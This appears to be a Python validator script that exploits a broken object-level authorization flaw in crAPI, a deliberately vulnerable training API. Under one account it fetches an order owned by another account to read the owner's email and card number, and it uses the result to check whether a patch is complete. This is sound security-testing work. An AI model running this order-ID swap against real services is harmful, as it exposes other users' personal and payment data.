"""Adversarial variant of the crAPI shop-order BOLA (validator's adversarial stage).

Same attack class as exploit.py, but deliberately VARIED so an incomplete patch
that only special-cases the primary reproducer is still caught:
  - different attacker/victim email prefixes (alice_/mallory_, not v_/a_)
  - different target object (product_id=2, so a different order)
  - different request shape (extra query string + custom header)

A correct ownership check blocks this too. A patch that only denies when the
victim's email looks like the primary reproducer's ("v_...") leaks here.

Exit 0 => still leaks (patch incomplete). Exit !=0 => BLOCKED.
Prints a machine-readable final line:  RESULT {json}
Usage: python adversarial.py --base-url http://localhost:8888
"""
import argparse, json, secrets, sys, requests

def signup_login(b, email, pw, name, number):
    requests.post(f"{b}/identity/api/auth/signup",
                  json={"name": name, "email": email, "number": number, "password": pw}, timeout=15)
    return requests.post(f"{b}/identity/api/auth/login",
                         json={"email": email, "password": pw}, timeout=15).json().get("token")

def main() -> int:
    ap = argparse.ArgumentParser(); ap.add_argument("--base-url", required=True)
    b = ap.parse_args().base_url.rstrip("/")
    sfx = secrets.token_hex(3); pw = "Pass123!"
    victim, attacker = f"alice_{sfx}@ex.com", f"mallory_{sfx}@ex.com"
    tv = signup_login(b, victim, pw, f"alice{sfx}", "417" + sfx[:7].ljust(7, "0"))
    ta = signup_login(b, attacker, pw, f"mallory{sfx}", "418" + sfx[:7].ljust(7, "0"))
    # different object: product_id 2
    oid = requests.post(f"{b}/workshop/api/shop/orders",
                        json={"product_id": 2, "quantity": 1},
                        headers={"Authorization": f"Bearer {tv}"}, timeout=15).json().get("id")
    # varied request shape: extra query param + custom header
    resp = requests.get(f"{b}/workshop/api/shop/orders/{oid}?src=mobile",
                        headers={"Authorization": f"Bearer {ta}", "X-Client": "mobile"}, timeout=15)
    r = resp.json() if resp.text.strip() else {}
    leaked_owner = r.get("order", {}).get("user", {}).get("email")
    leaked_card = r.get("payment", {}).get("card_number")
    leaked = leaked_owner == victim and bool(leaked_card)
    result = {"defect": "shop-order", "kind": "adversarial", "leaked": leaked,
              "status": resp.status_code, "order_id": oid}
    if leaked:
        print(f"EXPLOIT-SUCCEEDED (adversarial): read {victim} order #{oid} card={leaked_card}")
    else:
        print(f"BLOCKED (adversarial): {r}")
    print("RESULT " + json.dumps(result))
    return 0 if leaked else 1

if __name__ == "__main__":
    sys.exit(main())
